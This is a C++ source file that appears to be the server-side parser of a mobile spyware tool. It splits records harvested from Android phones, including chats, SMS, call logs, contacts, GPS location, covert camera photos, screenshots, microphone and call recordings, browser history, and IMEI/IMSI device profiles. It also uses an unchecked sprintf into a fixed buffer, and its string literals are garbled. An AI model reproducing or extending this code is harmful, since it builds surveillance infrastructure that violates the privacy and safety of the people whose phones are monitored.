#include "JsonSplit.h"
#include "jsonParser.h"
#include "Coder.h"
#include "fileoperator.h"
#include "PublicFunction.h"
#include <string>

using namespace std;

int JsonSplit::splitChatMessage(string data, string &people, string &message,string &timenow,string &type,string &group,string &package) {
	people = JsonParser::getStringValue(data, "people");
	message = JsonParser::getStringValue(data, "message");
	timenow = JsonParser::getBaseValue(data, "time");
	type = JsonParser::getBaseValue(data, "type");
	group = JsonParser::getStringValue(data, "group");
	package = JsonParser::getStringValue(data, "name");
	return 0;
}

int JsonSplit::splitMessage(string data, string &number, string &content,string &type,string &timenow,string &ID) {
	number = JsonParser::getStringValue(data, "\xE5\x8F\xB7\xE7\xA0\x81");
	content = JsonParser::getStringValue(data, "\xE6\xB6\x88\xE6\x81\xAF\xE5\x86\x85\xE5\xAE\xB9");

	type = JsonParser::getStringValue(data, "\xE7\xB1\xBB\xE5\x9E\x8B");

	timenow = JsonParser::getStringValue(data, "\xE6\x97\xB6\xE9\x97\xB4");

	ID = JsonParser::getStringValue(data, "ID");

	return 0;
}


int JsonSplit::splitCallLog(string data, string &type, string &number, string &timenow, string &duration) {
	string calltype = JsonParser::getStringValue(data, "\xE7\xB1\xBB\xE5\x9E\x8B");
	if (strstr(calltype.c_str(),"\xE6\x9C\xAA\xE6\x8E\xA5"))
	{
		type = "3";
	}
	else if (strstr(calltype.c_str(), "\xE5\x91\xBC\xE5\x85\xA5"))		//call in
	{
		type = "1";
	}
	else if (strstr(calltype.c_str(), "\xE5\x91\xBC\xE5\x87\xBA"))	//call out
	{
		type = "2";
	}
	else
	{
		type = "4";
	}

	number = JsonParser::getStringValue(data, "\xE5\x8F\xB7\xE7\xA0\x81");

	timenow = JsonParser::getStringValue(data, "\xE6\x97\xB6\xE9\x97\xB4");

	duration = JsonParser::getStringValue(data, "\xE6\x97\xB6\xE9\x95\xBF");

	return 0;
}

int JsonSplit::splitContacts(string data, string &name, string & num) {
	num = JsonParser::getStringValue(data, "\xE5\x8F\xB7\xE7\xA0\x81");
	name = JsonParser::getStringValue(data, "\xE7\xA7\xB0\xE5\x91\xBC");
	return 0;
}


int JsonSplit::splitLocation(string data, string & lat, string & lon, string &status, string &timenow,string & address) {
	status = JsonParser::getStringValue(data, "status");
	lat = JsonParser::getStringValue(data, "latitude");
	lon = JsonParser::getStringValue(data, "longitude");
	timenow = JsonParser::getStringValue(data, "time");
	address = JsonParser::getStringValue(data, "address");
	return 0;
}

int JsonSplit::splitCamera(string filename, string &timenow) {
	int pos = filename.find("_cameraphoto.jpg");
	if (pos >= 0)
	{
		timenow = filename.substr(0, pos);

	}
	return 0;
}

int JsonSplit::splitScreenShot(string filename, string &timenow) {
	int pos = filename.find("_screensnapshot.jpg");
	if (pos >= 0)
	{
		timenow = filename.substr(0, pos);

	}
	return 0;
}



int JsonSplit::splitEnvAudioName(string name, string &timenow) {
	int pos = name.find("_micaudio");
	if (pos >= 0)
	{
		timenow = name.substr(0,pos);

	}
	return 0;
}

int JsonSplit::splitCallAudioName(string name, string &number, string &timenow, string &type) {
	int pos = name.find("_");
	if (pos >= 0)
	{
		number = name.substr(0,pos);

		pos++;
		timenow = name.substr(pos);

		pos = timenow.find("_in_");
		if (pos >= 0)
		{
			type = "1";
			timenow = timenow.substr(0, pos);
		}
		else {
			pos = timenow.find("_out_");
			if (pos >= 0)
			{
				type = "2";
				timenow = timenow.substr(0, pos);
			}
		}
	}
	return 0;
}


int JsonSplit::splitRunningApps(string data, string & pname, string & pid,string &uid,string &lru,string &description) {
	pname = JsonParser::getStringValue(data, "\xE7\xA8\x8B\xE5\xBA\x8F\xE5\x90\x8D\xE7\xA7\xB0");
	pid = JsonParser::getStringValue(data, "\xE8\xBF\x9B\xE7\xA8\x8B\x49\x44");
	uid = JsonParser::getStringValue(data, "\xE7\x94\xA8\xE6\x88\xB7\x49\x44");
	lru = JsonParser::getStringValue(data, "LRU");
	description = JsonParser::getStringValue(data, "\xE6\x8F\x8F\xE8\xBF\xB0");
	return 0;
}

int JsonSplit::splitInstallApps(string data, string & name, string &packagename, string &setuptime, string &lastupdatetime, string &ver,string & type) {
	name = JsonParser::getStringValue(data, "\xE5\xBA\x94\xE7\x94\xA8\xE5\x90\x8D\xE7\xA7\xB0");
	packagename = JsonParser::getStringValue(data, "\xE5\x8c\x85\xE5\x90\x8D");

	setuptime = JsonParser::getStringValue(data, "\xE5\xAE\x89\xE8\xA3\x85\xE6\x97\xB6\xE9\x97\xB4");

	lastupdatetime = JsonParser::getStringValue(data, "\xE6\x9C\x80\xE8\xBF\x91\xE6\x9B\xB4\xE6\x96\xB0\xE6\x97\xB6\xE9\x97\xB4");

	ver = JsonParser::getStringValue(data, "\xE7\x89\x88\xE6\x9C\xAC");

	type = JsonParser::getStringValue(data, "type");

	return 0;
}



int JsonSplit::splitWifi(string data, string & name, string & bssid, string &time) {
	name = JsonParser::getStringValue(data, "name");
	bssid = JsonParser::getStringValue(data, "bssid");
	time = JsonParser::getBaseValue(data, "time");
	return 0;
}


int JsonSplit::splitBrowserRecord(string data,string &type, string & ts, string & title, string &url,string & count,string &ctime) {
	
	type = JsonParser::getStringValue(data, "\xE7\xB1\xBB\xE5\x9E\x8B");
	title = JsonParser::getStringValue(data, "\xE6\xA0\x87\xE9\xA2\x98");

	url = JsonParser::getStringValue(data, "\xE9\x93\xBE\xE6\x8E\xA5");

	ctime = JsonParser::getStringValue(data, "\xE5\x88\x9B\xE5\xBB\xBA\xE6\x97\xB6\xE9\x97\xB4");

	count = JsonParser::getStringValue(data, "\xE8\xAE\xBF\xE9\x97\xAE\xE6\xAC\xA1\xE6\x95\xB0");

	ts = JsonParser::getStringValue(data, "\xE8\xAE\xBF\xE9\x97\xAE\xE6\x97\xB6\xE9\x97\xB4");

	return 0;
}



string JsonSplit::slitInfomation(string &stroldutf8info, string &model) {
	
	int ret = 0;

	model = JsonParser::getStringValue(stroldutf8info, "\xE5\x9E\x8B\xE5\x8F\xB7");
	
	char * oldgbkinfo = "";
	int len  = Coder::UTF8ToGBK(stroldutf8info.c_str(), &oldgbkinfo);
	if (len <= 0)
	{
		return stroldutf8info;
	}
	string info = string(oldgbkinfo, len);
	delete oldgbkinfo;

	string format = 
		"{\"IMEI0\":\"%s\",\"�ͺ�\":\"%s\",\"sim��״̬\":\"%s\",\"�̱�\":\"%s\",\"�ֻ�����1\":\"%s\","
		"\"�豸�汾\":\"%s\",\"��������\":\"%s\",\"�����Ϣ\":\"%s\",\"SD������\":\"%s\",\"ϵͳ�������ʱ��\":\"%s\","
		"\"����\":\"%s\",\"����IP��ַ\":\"%s\",\"MAC��ַ\":\"%s\",\"API�汾\":%s,\"������\":\"%s\","
		"\"IP��ַ\":\"%s\",\"SDʣ������\":\"%s\",\"���ڴ�\":\"%s\",\"sim����\":\"%s\","
		"\"ָ��\":\"%s\",\"IMSI0\":\"%s\","
		"\"Kernel�汾\":\"%s\",\"�ֱ���\":\"%s\",\"���к�\":\"%s\",\"����\":\"%s\","
		"\"�����ڴ�\":\"%s\",\"cpu��Ϣ\":\"%s\",\"��������\":\"%s\",\"������ʱ��\":\"%s\","
		"\"�汾\":\"%s\",\"USER\":\"%s\",\"��Ļ\":\"%s\",\"�豸ID\":\"%s\","
		"\"��������״̬\":%s,\"��Ʒ����\":\"%s\",\"�Ƿ�����\":\"%s\",\"android ID\":\"%s\",\"�����汾\":\"%s\","
		"\"WIFI\":\"%s\",\"��Ӫ��\":\"%s\"}";

	string imei0 = JsonParser::getStringValue(info,"IMEI0");
	if (imei0 == "")
	{
		imei0 = JsonParser::getStringValue(info, "IMEI1");
	}
	string xinghao = JsonParser::getStringValue(info, "�ͺ�");
	string simcard = JsonParser::getStringValue(info, "sim��״̬");
	string shangbiao = JsonParser::getStringValue(info, "�̱�");
	string haoma = JsonParser::getStringValue(info, "�ֻ�����1");
	if (haoma == "")
	{
		haoma = JsonParser::getStringValue(info, "�ֻ�����2");
	}

	string shebeibanben = JsonParser::getStringValue(info, "�豸�汾");
	string wangluoleixing = JsonParser::getStringValue(info, "��������");
	string dcxx = JsonParser::getStringValue(info, "�����Ϣ");

	string sdrongliang = JsonParser::getStringValue(info, "SD������");
	string xtgxsj = JsonParser::getStringValue(info, "ϵͳ�������ʱ��");
	string guojia = JsonParser::getStringValue(info, "����");
	string waiwangip = JsonParser::getStringValue(info, "����IP��ַ");
	string macdizhi = JsonParser::getStringValue(info, "MAC��ַ");
	string apibanben = JsonParser::getBaseValue(info, "API�汾");
	string zhizhaoshang = JsonParser::getStringValue(info, "������");
	string ipdizhi = JsonParser::getStringValue(info, "IP��ַ");
	string sdsyrl = JsonParser::getStringValue(info, "SDʣ������");
	string znc = JsonParser::getStringValue(info, "���ڴ�");

	string simkahao = JsonParser::getStringValue(info, "sim����");
	string zhiwen = JsonParser::getStringValue(info, "ָ��");
	string ims0 = JsonParser::getStringValue(info, "IMSI0");
	if (ims0 == "")
	{
		ims0 = JsonParser::getStringValue(info, "IMSI1");
	}
	string kernelbb = JsonParser::getStringValue(info, "Kernel�汾");
	string fbl = JsonParser::getStringValue(info, "�ֱ���");
	string xlh = JsonParser::getStringValue(info, "���к�");
	string wangluo = JsonParser::getStringValue(info, "����");
	string kync = JsonParser::getStringValue(info, "�����ڴ�");
	string cpuxx = JsonParser::getStringValue(info, "cpu��Ϣ");
	string wlmc = JsonParser::getStringValue(info, "��������");
	string yqdsj = JsonParser::getStringValue(info, "������ʱ��");
	string banben = JsonParser::getStringValue(info, "�汾");
	string user = JsonParser::getStringValue(info, "USER");
	
	string pingmu = JsonParser::getStringValue(info, "��Ļ");
	string shebeiid = JsonParser::getStringValue(info, "�豸ID");

	string sjljzt = JsonParser::getBaseValue(info, "��������״̬");
	string cpmc = JsonParser::getStringValue(info, "��Ʒ����");
	string sfmy = JsonParser::getStringValue(info, "�Ƿ�����");
	string androidid = JsonParser::getStringValue(info, "android ID");
	string jdbb = JsonParser::getStringValue(info, "�����汾");
	string yys = JsonParser::getStringValue(info, "��Ӫ��");

	string wifi = JsonParser::getQuotaStringValue(info, "WIFI");
	if (wifi == "")
	{
		wifi = JsonParser::getStringValue(info, "WIFI");			//"WIFI":"\"dlink\""
	}
	replaceSplashAndEnterAndQuot(wifi);

	int pos = cpuxx.find("Processor\\t: ");
	if (pos >= 0)
	{
		cpuxx = cpuxx.replace(pos, lstrlenA("Processor\\t: "), "");		//"Processor\t: AArch64 Processor rev 4 (aarch64)"
	}
	pos = cpuxx.find("processor\\t: ");
	if (pos >= 0)
	{
		cpuxx = cpuxx.replace(pos, lstrlenA("processor\\t: "), "");		//"Processor\t: AArch64 Processor rev 4 (aarch64)"
	}
	replaceSplashAndEnterAndQuot(cpuxx);

// 	for (int i = 0; i < cpuxx.length(); i ++)
// 	{
// 		if (cpuxx.at(i) == '\r' || cpuxx.at(i) == '\n' || cpuxx.at(i) == '\t' || cpuxx.at(i) == '\b'
// 			|| cpuxx.at(i) == '\'' || cpuxx.at(i) == '\"' || cpuxx.at(i) == '\\')
// 		{
// 			cpuxx.at(i) = ' ';
// 		}
// 	}

	char newgbkinfo[0x1000] = { 0 };
	sprintf(newgbkinfo, format.c_str(),
		imei0.c_str(), xinghao.c_str(), simcard.c_str(), shangbiao.c_str(), haoma.c_str(), shebeibanben.c_str(), wangluoleixing.c_str(), dcxx.c_str(),
		sdrongliang.c_str(), xtgxsj.c_str(), guojia.c_str(), waiwangip.c_str(), macdizhi.c_str(), apibanben.c_str(), zhizhaoshang.c_str(), ipdizhi.c_str(), sdsyrl.c_str(), znc.c_str(),
		simkahao.c_str(), zhiwen.c_str(), ims0.c_str(), kernelbb.c_str(), fbl.c_str(), xlh.c_str(), wangluo.c_str(), kync.c_str(), cpuxx.c_str(), wlmc.c_str(), yqdsj.c_str(), banben.c_str(), user.c_str(),
		pingmu.c_str(), shebeiid.c_str(), sjljzt.c_str(), cpmc.c_str(), sfmy.c_str(), androidid.c_str(), jdbb.c_str(),  wifi.c_str(),yys.c_str()
	);

	char * newutf8info = 0;
	len = Coder::GBKToUTF8(newgbkinfo, &newutf8info);
	if (len <= 0) {
		return stroldutf8info;
	}

	string strnewutf8info = string(newutf8info, len);
	delete newutf8info;

#ifdef _DEBUG
	FileOperator::fileWriter("dev.json", strnewutf8info.c_str(), strnewutf8info.length());
#endif
	return strnewutf8info;
}